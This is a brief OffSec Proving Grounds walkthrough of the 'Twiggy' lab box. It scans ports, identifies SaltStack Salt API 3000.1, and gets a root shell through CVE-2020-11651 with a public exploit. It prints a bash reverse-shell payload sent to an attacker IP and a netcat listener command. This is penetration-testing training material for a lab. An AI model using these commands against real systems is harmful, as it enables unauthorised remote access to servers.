# Twiggy — OffSec Proving Grounds Walkthrough

> ⚠️ **Note:** This writeup is a bit short — the original notes were minimal and the box was rooted directly via RCE without needing privilege escalation. What you see is what there is.

**Platform:** Proving Grounds Practice
**Difficulty:** Easy
**OS:** Linux

---

## TL;DR

Salt API running on port 8000 → vulnerable to CVE-2020-11651 (RCE) → instant root shell.

---

## Enumeration

Quick full port scan to see what's exposed:

```bash
nmap -sV -p- 192.168.236.62
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | nginx 1.16.1 |
| 4505 | ZMTP | ZeroMQ ZMTP 2.0 |
| 4506 | ZMTP | ZeroMQ ZMTP 2.0 |
| 8000 | HTTP | nginx 1.16.1 |

Ports 4505 and 4506 are the default ports for **ZeroMQ** — this is commonly used by **SaltStack**. Let's poke at port 8000:

```bash
curl -v http://192.168.236.62:8000
```

```json
{
  "clients": ["local", "local_async", "local_batch", "local_subset", "runner", "runner_async", "ssh", "wheel", "wheel_async"],
  "return": "Welcome"
}
```

The `X-Upstream` header confirms it: **salt-api/3000-1**. SaltStack Salt API version 3000.1.

---

## Exploitation — CVE-2020-11651 (SaltStack RCE)

A quick search for Salt API 3000-1 exploits leads us to **EDB-48421** — a remote code execution vulnerability in SaltStack Salt before version 3000.2.

Download the exploit and fire it off:

```bash
python3 exploit.py -m 192.168.236.62 --exec 'bash -i >& /dev/tcp/192.168.45.176/6969 0>&1' -p 4506
```

Set up a netcat listener beforehand:

```bash
nc -lvnp 6969
```

And we've got a shell — **as root**, no less. No priv esc needed here. The Salt API was running as root, so the RCE drops us straight into a root shell. Easy day. 🎉

---

## Key Takeaways

- **ZeroMQ ports 4505/4506** are a dead giveaway for SaltStack — always check for known CVEs
- **CVE-2020-11651** is a critical auth bypass + RCE in SaltStack — if you see Salt API, check the version immediately
- Sometimes the box really is this straightforward

---

*Thanks for reading! Follow for more OffSec walkthroughs.*
